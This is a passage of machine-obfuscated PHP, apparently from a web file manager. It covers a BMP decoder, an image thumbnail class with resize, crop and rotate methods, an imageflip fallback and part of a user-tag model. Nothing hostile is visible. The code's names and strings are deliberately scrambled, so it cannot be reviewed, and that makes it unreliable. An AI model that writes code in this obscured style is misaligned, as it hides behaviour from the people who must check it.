$d™‹ñĞÌ…¿ = -(~$d™‹ñĞÌ…¿ & 4294967295) - 1; } goto E¦Ã½à„¨æ; aäõÑçƒƒ: $BäË…¿ù„» = fread($f²²ñÂÌ‚¤, 36); if ($BäË…¿ù„» === !1) { return !1; } extract(unpack($CğİÆ†±‘…[1856] . $CğİÆ†±‘…[1857] . $CğİÆ†±‘…[1854] . $CğİÆ†±‘…[1858] . $CğİÆ†±‘…[1859] . $CğİÆ†±‘…[1860] . $CğİÆ†±‘…[1861] . $CğİÆ†±‘…[1862] . $CğİÆ†±‘…[1863] . $CğİÆ†±‘…[1864], $BäË…¿ù„»)); goto B´¹È¥Ä¿Œ; AšÅ¬ëƒÎ: if (($få˜öŸÑòî == 16 || $få˜öŸÑòî == 24 || $få˜öŸÑòî == 32) && $Dİ®İÁ¤â¼ == 0 && $DåìÑÄ©Úå == 0 && $CŠ†ÈŒ‹ˆ == 0 && $BÛºìĞä±º == 0) { switch ($få˜öŸÑòî) { case 16: $DåìÑÄ©Úå = 31744; $CŠ†ÈŒ‹ˆ = 992; $BÛºìĞä±º = 31; break; case 24: case 32: $DåìÑÄ©Úå = 16711680; $CŠ†ÈŒ‹ˆ = 65280; $BÛºìĞä±º = 255; break; } } goto a¦Ñ¯¦¸³í; a¦Ñ¯¦¸³í: } } goto eˆ’›¹å‰Ê; fËÔîš”®: if ($få˜öŸÑòî == 1 || $få˜öŸÑòî == 4 || $få˜öŸÑòî == 8) { goto BÁ‘”Ê§œ; c¿­ŞéÏê: $FåæÎœïõÍ = (1 << $få˜öŸÑòî) - 1 << $Céê‡óàß¨; if ($Dİ®İÁ¤â¼ == 1 || $Dİ®İÁ¤â¼ == 2) { $Dê°Ìà“œˆ = 0; $B–”ÎÁ—¿î = $få˜öŸÑòî >> 2 & 1; for (;;) { if ($Dê°Ìà“œˆ < -1 || $Dê°Ìà“œˆ > $f¬¯ê«¬éÈ || $fÃ°ˆ¦‚„’ < -1 || $fÃ°ˆ¦‚„’ > $AíËê¶‚â) { imagedestroy($Aêí“–ŠØ¦); return !1; } $BäË…¿ù„» = fread($f²²ñÂÌ‚¤, 1); if ($BäË…¿ù„» === !1) { imagedestroy($Aêí“–ŠØ¦); return !1; } switch ($BäË…¿ù„») { case $CğİÆ†±‘…[1869]: $BäË…¿ù„» = fread($f²²ñÂÌ‚¤, 1); if ($BäË…¿ù„» === !1) { imagedestroy($Aêí“–ŠØ¦); return !1; } switch ($BäË…¿ù„») { case $CğİÆ†±‘…[1869]: $fÃ°ˆ¦‚„’ += $FŒ‘»‹Ãİ†; $Dê°Ìà“œˆ = 0; break; case $CğİÆ†±‘…[1871]: $fÃ°ˆ¦‚„’ = 0; $Dê°Ìà“œˆ = 0; break 3; case $CğİÆ†±‘…[1872]: $BäË…¿ù„» = fread($f²²ñÂÌ‚¤, 2); if ($BäË…¿ù„» === !1) { imagedestroy($Aêí“–ŠØ¦); return !1; } list(, $C‡‚ê®‚Ş„, $f±‚´×†) = unpack($CğİÆ†±‘…[1873], $BäË…¿ù„»); $Dê°Ìà“œˆ += $C‡‚ê®‚Ş„; $fÃ°ˆ¦‚„’ += $f±‚´×† * $FŒ‘»‹Ãİ†; break; default: list(, $dµ×˜©Öç) = unpack($CğİÆ†±‘…[1874], $BäË…¿ù„»); $eßã‚©“á = ($dµ×˜©Öç >> $B–”ÎÁ—¿î) + ($dµ×˜©Öç & $B–”ÎÁ—¿î); $BäË…¿ù„» = fread($f²²ñÂÌ‚¤, $eßã‚©“á + 1 & ~1); if ($BäË…¿ù„» === !1) { imagedestroy($Aêí“–ŠØ¦); return !1; } for ($Aô»›ùµŒŠ = 0, $fëËöæéó = 0; $Aô»›ùµŒŠ < $dµ×˜©Öç; ++$Aô»›ùµŒŠ, ++$Dê°Ìà“œˆ, $fëËöæéó += $få˜öŸÑòî) { list(, $A‘Ã¬•õß) = unpack($CğİÆ†±‘…[1874], $BäË…¿ù„»[$fëËöæéó >> 3]); $Cğ‹ˆéìë = $fëËöæéó & 7; imagesetpixel($Aêí“–ŠØ¦, $Dê°Ìà“œˆ, $fÃ°ˆ¦‚„’, $E¸Õ³İœ¥[($A‘Ã¬•õß & $FåæÎœïõÍ >> $Cğ‹ˆéìë) >> $Céê‡óàß¨ - $Cğ‹ˆéìë]); } break; } break; default: $FÛ”öÒ×…’ = fread($f²²ñÂÌ‚¤, 1); if ($FÛ”öÒ×…’ === !1) { imagedestroy($Aêí“–ŠØ¦); return !1; } list(, $f§¸Üâ¾†‚, $A‘Ã¬•õß) = unpack($CğİÆ†±‘…[1873], $BäË…¿ù„» . $FÛ”öÒ×…’); for ($Aô»›ùµŒŠ = 0, $fëËöæéó = 0; $Aô»›ùµŒŠ < $f§¸Üâ¾†‚; ++$Aô»›ùµŒŠ, ++$Dê°Ìà“œˆ, $fëËöæéó += $få˜öŸÑòî) { $Cğ‹ˆéìë = $fëËöæéó & 7; imagesetpixel($Aêí“–ŠØ¦, $Dê°Ìà“œˆ, $fÃ°ˆ¦‚„’, $E¸Õ³İœ¥[($A‘Ã¬•õß & $FåæÎœïõÍ >> $Cğ‹ˆéìë) >> $Céê‡óàß¨ - $Cğ‹ˆéìë]); } break; } } } else { for ($bõÂÍ†Œîö = 0; $bõÂÍ†Œîö < $bÆÜòÎÕÈà; ++$bõÂÍ†Œîö, $fÃ°ˆ¦‚„’ += $FŒ‘»‹Ãİ†) { $BäË…¿ù„» = fread($f²²ñÂÌ‚¤, $fÛ—Ç¯«Œ); if ($BäË…¿ù„» === !1) { imagedestroy($Aêí“–ŠØ¦); return !1; } $fëËöæéó = 0; for ($Dê°Ìà“œˆ = 0; $Dê°Ìà“œˆ < $f¬¯ê«¬éÈ; ++$Dê°Ìà“œˆ, $fëËöæéó += $få˜öŸÑòî) { list(, $A‘Ã¬•õß) = unpack($CğİÆ†±‘…[1874], $BäË…¿ù„»[$fëËöæéó >> 3]); $Cğ‹ˆéìë = $fëËöæéó & 7; imagesetpixel($Aêí“–ŠØ¦, $Dê°Ìà“œˆ, $fÃ°ˆ¦‚„’, $E¸Õ³İœ¥[($A‘Ã¬•õß & $FåæÎœïõÍ >> $Cğ‹ˆéìë) >> $Céê‡óàß¨ - $Cğ‹ˆéìë]); } } } goto eªÅ§ğ‹Í¾; BÁ‘”Ê§œ: $Aêí“–ŠØ¦ = imagecreate($f¬¯ê«¬éÈ, $bÆÜòÎÕÈà); $Eìªö°ÁÊ = $fˆ¨Ú¬„Ş == 12 ? 3 : 4; $EÉ‰Õ¦÷ã‡ = $Eè©³±ò§ ? $Eè©³±ò§ : pow(2, $få˜öŸÑòî); goto E¥¨¸ŞŸÀŞ; E¥¨¸ŞŸÀŞ: $E¸Õ³İœ¥ = array(); for ($Aô»›ùµŒŠ = 0; $Aô»›ùµŒŠ < $EÉ‰Õ¦÷ã‡; ++$Aô»›ùµŒŠ) { $BäË…¿ù„» = fread($f²²ñÂÌ‚¤, $Eìªö°ÁÊ); if ($BäË…¿ù„» === !1) { imagedestroy($Aêí“–ŠØ¦); return !1; } extract(unpack($CğİÆ†±‘…[1870], $BäË…¿ù„» . $CğİÆ†±‘…[1869])); $E¸Õ³İœ¥[] = imagecolorallocate($Aêí“–ŠØ¦, $D™œ¶ÖÁó¢, $CËÇøÑù›, $Cğ‹ˆéìë); } $Céê‡óàß¨ = 8 - $få˜öŸÑòî; goto c¿­ŞéÏê; eªÅ§ğ‹Í¾: } else { goto bŠ……¸®éå; eÃÊÙ²µé×: for ($bõÂÍ†Œîö = 0; $bõÂÍ†Œîö < $bÆÜòÎÕÈà; ++$bõÂÍ†Œîö, $fÃ°ˆ¦‚„’ += $FŒ‘»‹Ãİ†) { $BäË…¿ù„» = fread($f²²ñÂÌ‚¤, $fÛ—Ç¯«Œ); if ($BäË…¿ù„» === !1) { imagedestroy($Aêí“–ŠØ¦); return !1; } $fëËöæéó = 0; for ($Dê°Ìà“œˆ = 0; $Dê°Ìà“œˆ < $f¬¯ê«¬éÈ; ++$Dê°Ìà“œˆ, $fëËöæéó += $c÷Á®õÆ™ò) { list(, $A‘Ã¬•õß) = unpack($CğİÆ†±‘…[1851], substr($BäË…¿ù„», $fëËöæéó, $c÷Á®õÆ™ò) . $CğİÆ†±‘…[1875]); $e—ï”­‡‰ì = $A‘Ã¬•õß & $fòÓŒ‰Æ‰; $F†Ô†ùæ› = $A‘Ã¬•õß & $DåìÑÄ©Úå; $dß¤ÑÈ§îÀ = $A‘Ã¬•õß & $CŠ†ÈŒ‹ˆ; $dÌ²”å‹ß = $A‘Ã¬•õß & $BÛºìĞä±º; $CÚ®•‚ = $E×¿ÅÑÀ‚ - (($e—ï”­‡‰ì << 7) - $e—ï”­‡‰ì) * $d¯µ„œ; $D™œ¶ÖÁó¢ = (($F†Ô†ùæ› << 8) - $F†Ô†ùæ›) * $Cèô’œ¤ôÍ; $CËÇøÑù› = (($dß¤ÑÈ§îÀ << 8) - $dß¤ÑÈ§îÀ) * $Eøˆ»°˜¸“; $Cğ‹ˆéìë = (($dÌ²”å‹ß << 8) - $dÌ²”å‹ß) * $Dßğ™Ë‰‘Ó; imagesetpixel($Aêí“–ŠØ¦, $Dê°Ìà“œˆ, $fÃ°ˆ¦‚„’, $CÚ®•‚ << 24 | $D™œ¶ÖÁó¢ << 16 | $CËÇøÑù› << 8 | $Cğ‹ˆéìë); } } imagealphablending($Aêí“–ŠØ¦, !0); goto dÑ½™Û„ê‰; aî’‹¨¨¯È: $c÷Á®õÆ™ò = $få˜öŸÑòî >> 3; $E×¿ÅÑÀ‚ = $fòÓŒ‰Æ‰ ? 127 : 0; $d¯µ„œ = $fòÓŒ‰Æ‰ ? 1 / $fòÓŒ‰Æ‰ : 1; goto AÄÔìĞÑ­ø; bŠ……¸®éå: $Aêí“–ŠØ¦ = imagecreatetruecolor($f¬¯ê«¬éÈ, $bÆÜòÎÕÈà); imagealphablending($Aêí“–ŠØ¦, !1); if ($fòÓŒ‰Æ‰) { imagesavealpha($Aêí“–ŠØ¦, !0); } goto aî’‹¨¨¯È; AÄÔìĞÑ­ø: $Cèô’œ¤ôÍ = $DåìÑÄ©Úå ? 1 / $DåìÑÄ©Úå : 1; $Eøˆ»°˜¸“ = $CŠ†ÈŒ‹ˆ ? 1 / $CŠ†ÈŒ‹ˆ : 1; $Dßğ™Ë‰‘Ó = $BÛºìĞä±º ? 1 / $BÛºìĞä±º : 1; goto eÃÊÙ²µé×; dÑ½™Û„ê‰: } return $Aêí“–ŠØ¦; goto b×´„š¬™Ú; fÄÛ™¢†Ù: $bÆÜòÎÕÈà = abs($AíËê¶‚â); $fÃ°ˆ¦‚„’ = $AíËê¶‚â > 0 ? $bÆÜòÎÕÈà - 1 : 0; $FŒ‘»‹Ãİ† = $AíËê¶‚â > 0 ? -1 : 1; goto fËÔîš”®; b×´„š¬™Ú: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($A³™³©ç³…, $aÄñ©ä) { goto AÓÉåè­‡¦; AÓÉåè­‡¦: $this->srcFile = $A³™³©ç³…; $this->echoType = $aÄñ©ä; $this->im = self::image($A³™³©ç³…); goto b„Ö…õæ¥å; b„Ö…õæ¥å: if (!$this->im) { return !1; } $Bæ›êÊ¢Œ’ = $_SERVER[…Ò×–][33]; $this->imgData = GetImageSize($A³™³©ç³…, $Bæ›êÊ¢Œ’); goto C•ã…é‰Ëì; C•ã…é‰Ëì: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto fÃ“Ùˆ’ÉÇ; fÃ“Ùˆ’ÉÇ: } public static function image($fê‡ùõ) { $DŒ¹ƒ²£Á¡ =& $_SERVER[…Ò×–]; $eš‘‰¾ÊîÑ = $DŒ¹ƒ²£Á¡[33]; $F§š¤Â¾ò = GetImageSize($fê‡ùõ, $eš‘‰¾ÊîÑ); $AİÇ­òğ£µ = !1; switch ($F§š¤Â¾ò[2]) { case IMAGETYPE_GIF: if (!function_exists($DŒ¹ƒ²£Á¡[1876])) { break; } $AİÇ­òğ£µ = imagecreatefromgif($fê‡ùõ); break; case IMAGETYPE_JPEG: if (!function_exists($DŒ¹ƒ²£Á¡[1877])) { break; } $AİÇ­òğ£µ = imagecreatefromjpeg($fê‡ùõ); break; case IMAGETYPE_PNG: if (!function_exists($DŒ¹ƒ²£Á¡[1878])) { break; } $AİÇ­òğ£µ = @imagecreatefrompng($fê‡ùõ); imagesavealpha($AİÇ­òğ£µ, !0); break; case IMAGETYPE_XBM: $AİÇ­òğ£µ = imagecreatefromxbm($fê‡ùõ); break; case IMAGETYPE_WBMP: $AİÇ­òğ£µ = imagecreatefromwbmp($fê‡ùõ); break; case IMAGETYPE_BMP: $AİÇ­òğ£µ = imagecreatefrombmp($fê‡ùõ); break; default: break; } return $AİÇ­òğ£µ; } public static function imageSize($bÖ‚”±¼æ) { $d¢‰£É®†š =& $_SERVER[…Ò×–]; $A¤È ·¶Ì… = GetImageSize($bÖ‚”±¼æ); if (!$A¤È ·¶Ì…) { return !1; } return array($d¢‰£É®†š[1879] => $A¤È ·¶Ì…[0], $d¢‰£É®†š[1880] => $A¤È ·¶Ì…[1]); } function distortion($b«™ô‰ê»¡, $dùœø®ÂÏ, $cçÎæ˜â) { $d¯ñ¾½¯åÙ = $this->creatImage($this->im, $dùœø®ÂÏ, $cçÎæ˜â, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($d¯ñ¾½¯åÙ, $b«™ô‰ê»¡); } function prorate($FÇƒ‡éÛ¯¢, $bêˆãİÌÚ, $FÕ‡Õ‚ö¡É) { $B¶¼¼×Ÿé† = $bêˆãİÌÚ / $FÕ‡Õ‚ö¡É; $f‚åŞ„Œ = $this->srcW / $this->srcH; if ($B¶¼¼×Ÿé† <= $f‚åŞ„Œ) { $Aˆ¼¸ØãÛç = $bêˆãİÌÚ; $Cì•áÖÍø” = $Aˆ¼¸ØãÛç * ($this->srcH / $this->srcW); } else { $Cì•áÖÍø” = $FÕ‡Õ‚ö¡É; $Aˆ¼¸ØãÛç = $Cì•áÖÍø” * ($this->srcW / $this->srcH); } if ($this->srcW > $bêˆãİÌÚ || $this->srcH > $FÕ‡Õ‚ö¡É) { $FÄØˆ¸®÷¥ = $this->creatImage($this->im, $Aˆ¼¸ØãÛç, $Cì•áÖÍø”, 0, 0, 0, 0, $this->srcW, $this->srcH); } else { $FÄØˆ¸®÷¥ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); } $FÄØˆ¸®÷¥ = $this->autoRotate($FÄØˆ¸®÷¥); return $this->echoImage($FÄØˆ¸®÷¥, $FÇƒ‡éÛ¯¢); } private function autoRotate($BÀö‘××ªà) { goto fÍµ±§íÄ; A‰„†„†³Á: if ($AÉ—´¬õï£[$fì›šåõ“µ[1882]] == 8) { $FæÈ˜¸×›† = 270; } if ($AÉ—´¬õï£[$fì›šåõ“µ[1882]] == 3) { $FæÈ˜¸×›† = 180; } return $this->rotateDegree($BÀö‘××ªà, $FæÈ˜¸×›†); goto aˆÉ„İÅì; fààÊøæ¹Í: if (!$AÉ—´¬õï£ || !isset($AÉ—´¬õï£[$fì›šåõ“µ[1882]]) || $AÉ—´¬õï£[$fì›šåõ“µ[1882]] == 1) { return $BÀö‘××ªà; } $FæÈ˜¸×›† = 0; if ($AÉ—´¬õï£[$fì›šåõ“µ[1882]] == 6) { $FæÈ˜¸×›† = 90; } goto A‰„†„†³Á; fÍµ±§íÄ: $fì›šåõ“µ =& $_SERVER[…Ò×–]; if (!$BÀö‘××ªà || !function_exists($fì›šåõ“µ[1881])) { return $BÀö‘××ªà; } $AÉ—´¬õï£ = exif_read_data($this->srcFile); goto fààÊøæ¹Í; aˆÉ„İÅì: } private function rotateDegree($C‹ÄÔô÷, $a‚ñ²˜Á) { if (!$C‹ÄÔô÷ || $a‚ñ²˜Á % 360 === 0 || !function_exists($_SERVER[…Ò×–][1883])) { return $C‹ÄÔô÷; } $EŒÚ›ˆŸÍÊ = imageRotate($C‹ÄÔô÷, 360 - $a‚ñ²˜Á, 0); imageDestroy($C‹ÄÔô÷); return $EŒÚ›ˆŸÍÊ ? $EŒÚ›ˆŸÍÊ : $C‹ÄÔô÷; } function cut($C±ôŠ‘çñÕ, $F¥ÇñŸŠ×½, $DÄ‘£ØĞ‹˜) { goto d¸ÖšàÛÔÁ; a˜õ èŞ–: $a¹ùîšæùç = $this->creatImage($this->im, $f—¡Æˆ½ö‰, $D¯Ó´„¹³å, 0, 0, 0, 0, $this->srcW, $this->srcH); $CŞ¿Ò÷•À = $this->creatImage($a¹ùîšæùç, $F¥ÇñŸŠ×½, $DÄ‘£ØĞ‹˜, 0, 0, ($f—¡Æˆ½ö‰ - $F¥ÇñŸŠ×½) / 2, ($D¯Ó´„¹³å - $DÄ‘£ØĞ‹˜) / 2, $F¥ÇñŸŠ×½, $DÄ‘£ØĞ‹˜); imageDestroy($a¹ùîšæùç); goto b²ìÂ‰Êã‚; d¸ÖšàÛÔÁ: $BöÌ¬ÅåŸî = $F¥ÇñŸŠ×½ / $DÄ‘£ØĞ‹˜; $CÃ¿áøÙáÁ = $this->srcW / $this->srcH; if ($BöÌ¬ÅåŸî <= $CÃ¿áøÙáÁ) { $D¯Ó´„¹³å = $DÄ‘£ØĞ‹˜; $f—¡Æˆ½ö‰ = $D¯Ó´„¹³å * ($this->srcW / $this->srcH); } else { $f—¡Æˆ½ö‰ = $F¥ÇñŸŠ×½; $D¯Ó´„¹³å = $f—¡Æˆ½ö‰ * ($this->srcH / $this->srcW); } goto a˜õ èŞ–; b²ìÂ‰Êã‚: return $this->echoImage($CŞ¿Ò÷•À, $C±ôŠ‘çñÕ); goto FÅ“ˆè‡Ş×; FÅ“ˆè‡Ş×: } function backFill($Eá£«ÒêÒ„, $dÕïàÙê—¨, $eÔíÔ¹º¦ö, $e—°İ—ê³ = false, $a©ØÒêä‹ = 255, $AÉïÚÄ¢íò = 255, $C¹Âö¦Ûæ‰ = 255) { goto E³Î†Ç‘«†; F´ÃêÜÆî: if (function_exists($_SERVER[…Ò×–][1884])) { @($däÒÃˆ¿¬§ = imageCreateTrueColor($dÕïàÙê—¨, $eÔíÔ¹º¦ö)); if (!$däÒÃˆ¿¬§) { $däÒÃˆ¿¬§ = imageCreate($dÕïàÙê—¨, $eÔíÔ¹º¦ö); } } else { $däÒÃˆ¿¬§ = imageCreate($dÕïàÙê—¨, $eÔíÔ¹º¦ö); } $E©ÇÆö¨º¨ = ($eÔíÔ¹º¦ö - $Aã¹íÊ•ó) / 2; $Cª…‰–˜Æ = imagecolorallocate($däÒÃˆ¿¬§, $a©ØÒêä‹, $AÉïÚÄ¢íò, $C¹Âö¦Ûæ‰); goto D ¹„Õµó†; D ¹„Õµó†: if ($e—°İ—ê³) { $Cª…‰–˜Æ = imageColorTransparent($däÒÃˆ¿¬§, $Cª…‰–˜Æ); $E©ÇÆö¨º¨ = $eÔíÔ¹º¦ö - $Aã¹íÊ•ó; } imageFilledRectangle($däÒÃˆ¿¬§, 0, 0, $dÕïàÙê—¨, $eÔíÔ¹º¦ö, $Cª…‰–˜Æ); if ($this->srcW > $dÕïàÙê—¨ || $this->srcH > $eÔíÔ¹º¦ö) { $C÷â Áøˆ© = $this->creatImage($this->im, $côî¼¡ù­, $Aã¹íÊ•ó, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($côî¼¡ù­ < $dÕïàÙê—¨) { imageCopy($däÒÃˆ¿¬§, $C÷â Áøˆ©, ($dÕïàÙê—¨ - $côî¼¡ù­) / 2, 0, 0, 0, $côî¼¡ù­, $Aã¹íÊ•ó); } else { if ($Aã¹íÊ•ó < $eÔíÔ¹º¦ö) { imageCopy($däÒÃˆ¿¬§, $C÷â Áøˆ©, 0, $E©ÇÆö¨º¨, 0, 0, $côî¼¡ù­, $Aã¹íÊ•ó); } else { imageCopy($däÒÃˆ¿¬§, $C÷â Áøˆ©, 0, 0, 0, 0, $côî¼¡ù­, $Aã¹íÊ•ó); } } } else { imageCopyMerge($däÒÃˆ¿¬§, $this->im, ($dÕïàÙê—¨ - $côî¼¡ù­) / 2, $E©ÇÆö¨º¨, 0, 0, $côî¼¡ù­, $Aã¹íÊ•ó, 100); } goto B…ËÔ°Û¾¾; E³Î†Ç‘«†: $b‹¿ƒ‰¹’˜ = $dÕïàÙê—¨ / $eÔíÔ¹º¦ö; $c¿•–ã‰ã† = $this->srcW / $this->srcH; if ($b‹¿ƒ‰¹’˜ <= $c¿•–ã‰ã†) { $côî¼¡ù­ = $dÕïàÙê—¨; $Aã¹íÊ•ó = $côî¼¡ù­ * ($this->srcH / $this->srcW); } else { $Aã¹íÊ•ó = $eÔíÔ¹º¦ö; $côî¼¡ù­ = $Aã¹íÊ•ó * ($this->srcW / $this->srcH); } goto F´ÃêÜÆî; B…ËÔ°Û¾¾: return $this->echoImage($däÒÃˆ¿¬§, $Eá£«ÒêÒ„); goto Då²Ğ‘æÒŒ; Då²Ğ‘æÒŒ: } function creatImage($fŞêà¨£Û‚, $B¹†™éà’, $fŠáº§¤µ¶, $F×í‡æˆ‚ğ, $DïˆÃ±›¯, $eÒæÒÂ°½Õ, $F…©¼Şœ´Œ, $cš°¬«¶£, $FÖ¹±ÙŒîŒ) { if (function_exists($_SERVER[…Ò×–][1884])) { @($aÅÀóİÛà = ImageCreateTrueColor($B¹†™éà’, $fŠáº§¤µ¶)); @imagealphablending($aÅÀóİÛà, !1); @imagesavealpha($aÅÀóİÛà, !0); if ($aÅÀóİÛà) { imageCopyResampled($aÅÀóİÛà, $fŞêà¨£Û‚, $F×í‡æˆ‚ğ, $DïˆÃ±›¯, $eÒæÒÂ°½Õ, $F…©¼Şœ´Œ, $B¹†™éà’, $fŠáº§¤µ¶, $cš°¬«¶£, $FÖ¹±ÙŒîŒ); } else { $aÅÀóİÛà = ImageCreate($B¹†™éà’, $fŠáº§¤µ¶); imageCopyResized($aÅÀóİÛà, $fŞêà¨£Û‚, $F×í‡æˆ‚ğ, $DïˆÃ±›¯, $eÒæÒÂ°½Õ, $F…©¼Şœ´Œ, $B¹†™éà’, $fŠáº§¤µ¶, $cš°¬«¶£, $FÖ¹±ÙŒîŒ); } } else { $aÅÀóİÛà = ImageCreate($B¹†™éà’, $fŠáº§¤µ¶); imageCopyResized($aÅÀóİÛà, $fŞêà¨£Û‚, $F×í‡æˆ‚ğ, $DïˆÃ±›¯, $eÒæÒÂ°½Õ, $F…©¼Şœ´Œ, $B¹†™éà’, $fŠáº§¤µ¶, $cš°¬«¶£, $FÖ¹±ÙŒîŒ); } return $aÅÀóİÛà; } public function imgRotate($e¢‰¨ïÎˆ, $d¿™ŠÍèÍï) { goto dÛ¬é°ì“²; dÛ¬é°ì“²: if (!$this->im || $d¿™ŠÍèÍï % 360 === 0 || !function_exists($_SERVER[…Ò×–][1883])) { return !1; } $EÜàŸ»¼„š = imageRotate($this->im, 360 - $d¿™ŠÍèÍï, 0); $aÑö³ÏÏ´“ = !1; goto bï‚“ÜÑœ•; bï‚“ÜÑœ•: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $aÑö³ÏÏ´“ = imagegif($EÜàŸ»¼„š, $e¢‰¨ïÎˆ); break; case IMAGETYPE_JPEG: $aÑö³ÏÏ´“ = imagejpeg($EÜàŸ»¼„š, $e¢‰¨ïÎˆ, 100); break; case IMAGETYPE_PNG: $aÑö³ÏÏ´“ = imagePNG($EÜàŸ»¼„š, $e¢‰¨ïÎˆ); break; default: break; } imageDestroy($EÜàŸ»¼„š); imageDestroy($this->im); goto FÁ¤œêÆ; FÁ¤œêÆ: return $aÑö³ÏÏ´“; goto FÔåÁ–ä÷Â; FÔåÁ–ä÷Â: } function echoImage($B¤ÇµÀ’§, $B”…¼¢«â¾) { goto Fäà–ÍĞâ; Fäà–ÍĞâ: $a‡ù˜Ì…£Á =& $_SERVER[…Ò×–]; if (!$B¤ÇµÀ’§) { return !1; } ob_get_clean(); goto B¾¦´Á¼; B¾¦´Á¼: $b¥ïïø»¯ = !1; $AØ–°À‘‹¥ = 90; switch ($this->echoType) { case $a‡ù˜Ì…£Á[1885]: $b¥ïïø»¯ = imagejpeg($B¤ÇµÀ’§, null, $AØ–°À‘‹¥); break; case $a‡ù˜Ì…£Á[171]: $b¥ïïø»¯ = imagejpeg($B¤ÇµÀ’§, $B”…¼¢«â¾, $AØ–°À‘‹¥); break; } goto AôŞ¬¿ÑÅï; AôŞ¬¿ÑÅï: imageDestroy($B¤ÇµÀ’§); imageDestroy($this->im); return $b¥ïïø»¯; goto EÈŞÈ¾Ÿ÷“; EÈŞÈ¾Ÿ÷“: } } if (!function_exists($_SERVER[…Ò×–][1886])) { define($_SERVER[…Ò×–][1887], 0); define($_SERVER[…Ò×–][1888], 1); define($_SERVER[…Ò×–][1889], 2); function imageflip($EÀÚÓ«µì», $c¥À‚¯³œà) { switch ($c¥À‚¯³œà) { case IMG_FLIP_HORIZONTAL: $B„æğÁ³ = imagesx($EÀÚÓ«µì») - 1; $E“†ÙÂÚé– = $B„æğÁ³ / 2; $C ğ›åË­ = imagesy($EÀÚÓ«µì»); $AÏ¡ª¼ŠùÊ = imageistruecolor($EÀÚÓ«µì») ? imagecreatetruecolor(1, $C ğ›åË­) : imagecreate(1, $C ğ›åË­); for ($D…öÆø¤¦ = 0; $D…öÆø¤¦ < $E“†ÙÂÚé–; ++$D…öÆø¤¦) { imagecopy($AÏ¡ª¼ŠùÊ, $EÀÚÓ«µì», 0, 0, $D…öÆø¤¦, 0, 1, $C ğ›åË­); imagecopy($EÀÚÓ«µì», $EÀÚÓ«µì», $D…öÆø¤¦, 0, $B„æğÁ³ - $D…öÆø¤¦, 0, 1, $C ğ›åË­); imagecopy($EÀÚÓ«µì», $AÏ¡ª¼ŠùÊ, $B„æğÁ³ - $D…öÆø¤¦, 0, 0, 0, 1, $C ğ›åË­); } break; case IMG_FLIP_VERTICAL: $AÇ¿½ÑÌÌ = imagesx($EÀÚÓ«µì»); $fÍ‚Ğš¼²  = imagesy($EÀÚÓ«µì») - 1; $AÁ…áêäˆ‰ = $fÍ‚Ğš¼²  / 2; $AÏ¡ª¼ŠùÊ = imageistruecolor($EÀÚÓ«µì») ? imagecreatetruecolor($AÇ¿½ÑÌÌ, 1) : imagecreate($AÇ¿½ÑÌÌ, 1); for ($DïãàÜßÜŞ = 0; $DïãàÜßÜŞ < $AÁ…áêäˆ‰; ++$DïãàÜßÜŞ) { imagecopy($AÏ¡ª¼ŠùÊ, $EÀÚÓ«µì», 0, 0, 0, $DïãàÜßÜŞ, $AÇ¿½ÑÌÌ, 1); imagecopy($EÀÚÓ«µì», $EÀÚÓ«µì», 0, $DïãàÜßÜŞ, 0, $fÍ‚Ğš¼²  - $DïãàÜßÜŞ, $AÇ¿½ÑÌÌ, 1); imagecopy($EÀÚÓ«µì», $AÏ¡ª¼ŠùÊ, 0, $fÍ‚Ğš¼²  - $DïãàÜßÜŞ, 0, 0, $AÇ¿½ÑÌÌ, 1); } break; case IMG_FLIP_BOTH: $AÇ¿½ÑÌÌ = imagesx($EÀÚÓ«µì»); $C ğ›åË­ = imagesy($EÀÚÓ«µì»); $AÏ¡ª¼ŠùÊ = imagerotate($EÀÚÓ«µì», 180, 0); imagecopy($EÀÚÓ«µì», $AÏ¡ª¼ŠùÊ, 0, 0, 0, 0, $AÇ¿½ÑÌÌ, $C ğ›åË­); break; default: return; } imagedestroy($AÏ¡ª¼ŠùÊ); } } goto FğÖ…° àç; EÌ‡Ü‚ö‚è: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\162\x5f\146\141\166"; protected function cacheFunctionAlias($EïÅŠ÷ç¯à) { $c“·õ¡Ö¹Ï =& $_SERVER[…Ò×–]; return array($c“·õ¡Ö¹Ï[2215] => array(USER_ID, $c“·õ¡Ö¹Ï[2216])); } protected function listData() { $B‘ ‹éÎé =& $_SERVER[…Ò×–]; $b‚†ŒÌ»õ = array($B‘ ‹éÎé[1441] => USER_ID, $B‘ ‹éÎé[439] => array($B‘ ‹éÎé[2219], 0)); $FáãêÖÁĞ = $B‘ ‹éÎé[2221]; $DÊ ëáŞ»À = $this->field($FáãêÖÁĞ)->where($b‚†ŒÌ»õ)->order($B‘ ‹éÎé[2222])->select(); return $DÊ ëáŞ»À ? $DÊ ëáŞ»À : array(); } protected function listByTag($b‘ÒÔº›¼å) { } protected function addToTag($EŞ‡ÅâØ…¯, $Aš©¶ÃÂ) { $EŸÉÆ÷Õ¤Ò =& $_SERVER[…Ò×–]; if (!Model($EŸÉÆ÷Õ¤Ò[2357])->listData($Aš©¶ÃÂ) || !Model($EŸÉÆ÷Õ¤Ò[757])->pathInfo($EŞ‡ÅâØ…¯)) { return !1; } $C·‡ß‰‚é = array($EŸÉÆ÷Õ¤Ò[1441] => USER_ID, $EŸÉÆ÷Õ¤Ò[439] => $Aš©¶ÃÂ, $EŸÉÆ÷Õ¤Ò[391] => $EŞ‡ÅâØ…¯, $EŸÉÆ÷Õ¤Ò[392] => $EŸÉÆ÷Õ¤Ò[386], $EŸÉÆ÷Õ¤Ò[390] => $EŸÉÆ÷Õ¤Ò[33], $EŸÉÆ÷Õ¤Ò[2123] => 0); if ($this->where($C·‡ß‰‚é)->find()) { return !1; } return $this->add($C·‡ß‰‚é); } protected function removeFromTag($A²»ù™¶„Ø, $B®‰¡ö«õˆ) { $aã’ëæƒ¦¯ =& $_SERVER[…Ò×–]; if (!Model($aã’ëæƒ¦¯[2357])->listData($B®‰¡ö«õˆ)) { return !1; } if (is_array($A²»ù™¶„Ø)) { $A²»ù™¶„Ø = array($aã’ëæƒ¦¯[7], $A²»ù™¶„Ø); } $CòÀİÜ¡¥ä = 